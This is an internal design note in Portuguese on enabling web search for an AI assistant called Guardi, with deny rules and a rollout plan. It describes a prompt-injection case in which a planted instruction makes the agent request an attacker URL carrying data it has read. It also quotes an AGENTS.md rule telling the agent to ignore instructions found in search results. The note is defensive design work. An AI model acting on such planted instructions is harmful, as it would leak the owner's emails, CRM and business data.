# Guardi pesquisando na internet — 18/11/2026

Pedido de colaboradores: o Guardi poder "procurar na internet". Decisões do
Erick (18/11/2026): **só `web_search`**, provedor **Brave**, **piloto no
`erick-bot`**; especialistas continuam sem internet.

## O que o OpenClaw oferece (docs.openclaw.ai/tools/web)

- `web_search`, `web_fetch`, `x_search` (`group:web`). O perfil `minimal` não
  traz nenhuma; o `coding` (especialistas) traz as três.
- Liga na config global: `tools.web.search.enabled` + `provider`. A chave do
  Brave vai em `BRAVE_API_KEY` no `~/.openclaw/.env` da VPS (ou
  `plugins.entries.brave.config.webSearch.apiKey`).
- Resultado volta marcado `externalContent.untrusted`.

## Por que só `web_search`

O Guardi lê e-mail, CRM, DataCore e GestorHS do dono. `web_fetch` é um GET em
URL que o modelo escolhe: um e-mail ou página com instrução plantada manda o
Guardi buscar `atacante/?d=<o que leu>` — vazamento sem cartão nem clique.
`web_search` fala só com o provedor fixo. `tools.web.fetch.enabled` e
`x_search` continuam `false` no gateway **e** negados no `deny` de todo agente
(defesa em profundidade: se alguém ligar o fetch globalmente, ninguém o ganha).

Risco residual aceito: a consulta vai ao Brave. O `AGENTS.md` proíbe pôr na
pesquisa dado do dono ou da HS (cliente, e-mail, valor, CRM).

## Desenho

- **Flag:** `internet` em `agent_profiles.sistemas_ligados` (sem migração; os
  leitores da coluna filtram por listas fixas e ignoram o valor).
  `publicar-bots-mcp.py --ligar-sistema <bot> internet` / `--ligar-internet-todos`.
- **`tools_do_bot(..., internet=True)`** põe `web_search` no `alsoAllow`. Sem a
  flag, `web_search` vai para o `deny`. `web_fetch` e `x_search` sempre no
  `deny` (`TRAVAS_DO_BOT`).
- **Especialistas:** `escopo_mcp_do_agente` garante as três no `deny` de todo
  agente que não é `minimal` — vale para os dois scripts de publicação e para
  agente criado pela tela.
- As três entram em `_DENY_PRESERVADO`: o recálculo de deny de qualquer
  publicação de banco as manteria apagando-as, senão.
- `AGENTS.md` do Guardi: um item em "Ferramentas" (fato público, cita o link,
  não segue instrução do resultado, nunca põe dado da casa na consulta).

## Produção, nesta ordem

1. `publicar-bots-mcp.py` (ensaio) → `--aplicar`: os denies entram ANTES de a
   busca existir. Não há ferramenta MCP nova, então não depende de deploy.
2. `--ligar-sistema erick-bot internet` + `publicar-bots-mcp.py --aplicar`.
3. `criar-bots-pessoais.py --reescrever-agents-md --aplicar --so <Erick>`.
4. Gateway (VPS): `BRAVE_API_KEY` no `~/.openclaw/.env`;
   `tools.web.search = {enabled: true, provider: "brave"}`; reiniciar.
5. Conferir **perguntando**: `erick-bot` tem `web_search` e não tem `web_fetch`;
   `nina` e `iris` não têm nenhuma das três; um Guardi sem a flag também não.
6. Depois do piloto: `--ligar-internet-todos --aplicar`, publicar e reescrever
   os `AGENTS.md`; changelog nessa hora (é quando as pessoas percebem).
